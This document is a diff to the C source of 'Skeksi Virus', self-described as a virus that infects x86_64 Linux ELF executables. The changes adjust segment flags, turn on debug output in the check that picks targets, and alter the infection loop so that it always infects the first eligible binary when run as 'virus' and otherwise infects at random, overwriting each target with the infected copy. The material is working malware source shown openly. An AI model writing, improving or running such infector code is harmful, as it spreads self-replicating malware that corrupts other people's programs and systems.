@@ -1,3 +1,8 @@
+/*
+ * Skeksi Virus v0.1 - infects files that are ELF_X86_64 Linux ET_EXEC's
+ * Written by ElfMaster - ryan@bitlackeys.org
+ */
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -16,6 +21,8 @@
 #include <sys/user.h>
 #include <sys/prctl.h>
 #include <sys/time.h>
+
+#define VIRUS_LAUNCHER_NAME "virus"
 
 struct linux_dirent64 {
         uint64_t             d_ino;
@@ -345,7 +352,7 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
                                 phdr[i].p_paddr -= paddingSize;
                                 phdr[i].p_filesz += paddingSize;
                                 phdr[i].p_memsz += paddingSize;
-				phdr[i].p_flags |= PF_W;
+				//phdr[i].p_flags |= PF_W;
                                 text_found = 1;
                 }
         }
@@ -460,23 +467,23 @@ int check_criteria(char *filename)
 	ehdr = (Elf64_Ehdr *)mem;
 	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
 	if(_memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) {
-	//	DEBUG_PRINT("not an ELF\n");
+		DEBUG_PRINT("not an ELF\n");
 		return -1;
 	}
 	magic = *(uint32_t *)((char *)&ehdr->e_ident[EI_PAD]);
 	if (magic == MAGIC_NUMBER) { //already infected? Then skip this file
-		//DEBUG_PRINT("is infected\n");
+		DEBUG_PRINT("is infected\n");
 		return -1;
 	}
 	if (ehdr->e_machine != EM_X86_64) {
-	//	DEBUG_PRINT("not x86_64\n");
+		DEBUG_PRINT("not x86_64\n");
 		return -1;
 	}
 	for (dynamic = 0, i = 0; i < ehdr->e_phnum; i++) 
 		if (phdr[i].p_type == PT_DYNAMIC)	
 			dynamic++;
 	if (!dynamic) {
-	//	DEBUG_PRINT("not dynamic\n");
+		DEBUG_PRINT("not dynamic\n");
 		return -1;
 	}
 	return 0;
@@ -496,7 +503,8 @@ void do_main(struct bootstrap_data *bootstrap)
 	mode_t mode;
 	uint32_t rnum;
 	elfbin_t self, target;
-	
+	int icount = 0;
+
 	/*
 	 * NOTE: 
 	 * we can't use string literals because they will be
@@ -538,13 +546,17 @@ void do_main(struct bootstrap_data *bootstrap)
 				continue;
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
 				continue;
-	//		rnum = get_random_number(10);
-         //               if (rnum != LUCKY_NUMBER)
-          //                      continue;
+			if (!_strcmp(&bootstrap->argv[0][2], VIRUS_LAUNCHER_NAME) && icount == 0)
+				goto infect;
+			rnum = get_random_number(10);
+                        if (rnum != LUCKY_NUMBER)
+                                continue;
+infect:
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
 			unload_target(&target);
 			_rename(TMP, fpath);
+			icount++;
 		}
 		
 	}
